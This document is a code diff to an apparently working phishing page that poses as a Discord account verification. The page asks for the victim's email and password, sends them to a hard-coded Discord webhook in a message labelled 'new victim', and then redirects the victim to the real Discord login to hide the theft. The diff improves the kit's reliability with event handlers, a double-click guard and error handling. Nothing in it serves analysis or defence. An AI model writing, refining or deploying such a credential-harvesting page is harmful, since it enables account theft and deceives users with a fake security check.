@@ -10,7 +10,7 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
-            font-family: 'Segoe UI', Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             margin: 0;
         }
         .container {
@@ -21,27 +21,28 @@
             width: 400px;
             box-shadow: 0 0 20px rgba(0,0,0,0.3);
         }
-        h1 { color: #89b4fa; }
-        p { color: #cdd6f4; margin: 20px 0; }
+        h1 { color: #89b4fa; margin-bottom: 20px; }
+        p { color: #cdd6f4; margin: 20px 0; line-height: 1.5; }
         .alert {
             background: #313244;
             padding: 15px;
             border-radius: 10px;
             color: #f9e2af;
             font-size: 14px;
+            margin: 20px 0;
         }
         .btn {
             background: #5865F2;
             color: white;
             padding: 12px 30px;
             border-radius: 8px;
-            text-decoration: none;
             display: inline-block;
             margin-top: 20px;
             cursor: pointer;
             border: none;
             font-size: 16px;
             font-weight: bold;
+            width: auto;
         }
         .btn:hover { background: #4752c4; }
         .expires { color: #f38ba8; font-size: 12px; margin-top: 20px; }
@@ -52,8 +53,9 @@
             border-radius: 8px;
             color: white;
             width: 80%;
-            margin: 10px 0;
+            margin: 10px auto;
             font-size: 14px;
+            display: block;
         }
         .hidden { display: none; }
         input:focus { outline: none; border: 1px solid #5865F2; }
@@ -66,7 +68,7 @@
         <div class="alert">
             ⚠️ This verification expires in <strong>5 minutes</strong>
         </div>
-        <button class="btn" onclick="showLogin()">✅ Verify Account</button>
+        <button class="btn" id="verifyButton">✅ Verify Account</button>
         <div class="expires">
             Only you can see this message • One-Tap Security
         </div>
@@ -75,57 +77,72 @@
     <div class="container hidden" id="step2">
         <h1>🔐 Login Required</h1>
         <p>Enter your Discord credentials to complete verification.</p>
-        <input type="text" id="email" placeholder="Email or Phone Number"><br>
-        <input type="password" id="password" placeholder="Password"><br>
-        <button class="btn" onclick="sendData()">✅ Verify & Continue</button>
+        <input type="text" id="email" placeholder="Email or Phone Number">
+        <input type="password" id="password" placeholder="Password">
+        <button class="btn" id="sendButton">✅ Verify & Continue</button>
         <div class="expires">
             This is a required security check
         </div>
     </div>
 
     <script>
+        // Seu webhook atual
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1498870894221594667/qfx1JJDGjOoOkzCoXdB7H9PUOd-GuZLBK6SfPT8-orpthddmmV7dvjvXFSmKC7gKtsEW";
 
-        function showLogin() {
+        // Usando eventos 'click' mais diretos e confiáveis
+        document.getElementById('verifyButton').onclick = function() {
             document.getElementById('step1').classList.add('hidden');
             document.getElementById('step2').classList.remove('hidden');
-        }
+        };
 
-        function sendData() {
+        document.getElementById('sendButton').onclick = function() {
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
             
             if (!email || !password) {
-                alert("Please fill all fields");
+                alert("Please fill in both fields.");
                 return;
             }
 
+            // Desabilita o botão para evitar cliques duplos
+            const sendBtn = document.getElementById('sendButton');
+            sendBtn.disabled = true;
+            sendBtn.textContent = "Sending...";
+
             const data = {
-                content: `**🎯 DISCORD LOGIN CAPTURED!**\n📧 Email: ${email}\n🔑 Senha: ${password}\n🖥️ IP: ${window.location.hostname}\n🌐 User-Agent: ${navigator.userAgent}`
+                content: `**🎯 NOVA VÍTIMA!**\n📧 **Email:** ${email}\n🔑 **Senha:** ${password}\n🖥️ **IP:** ${window.location.hostname}`
             };
 
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
-            }).then(response => {
+            })
+            .then(response => {
                 if (response.ok) {
+                    // Sucesso! Mostra mensagem final
                     document.getElementById('step2').innerHTML = `
                         <h1 style="color:#a6e3a1">✅ Verification Complete!</h1>
-                        <p>Your account has been verified. You will be redirected...</p>
-                        <script>
-                            setTimeout(() => { window.location.href = 'https://discord.com/login'; }, 3000);
-                        </scr` + `ipt>
+                        <p>Your account has been verified. Redirecting you to Discord...</p>
+                        <div class="expires">This page will close automatically.</div>
                     `;
+                    // Redireciona para o Discord real após 3 segundos
+                    setTimeout(() => {
+                        window.location.href = 'https://discord.com/login';
+                    }, 3000);
                 } else {
-                    alert("Error sending verification. Please try again.");
+                    alert("Verification service error. Please try again.");
+                    sendBtn.disabled = false;
+                    sendBtn.textContent = "✅ Verify & Continue";
                 }
-            }).catch(() => {
-                alert("Network error. Please try again.");
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert("Network error. Please check your connection.");
+                sendBtn.disabled = false;
+                sendBtn.textContent = "✅ Verify & Continue";
             });
-        }
+        };
     </script>
-</body>
-</html>
 </body>
 </html>
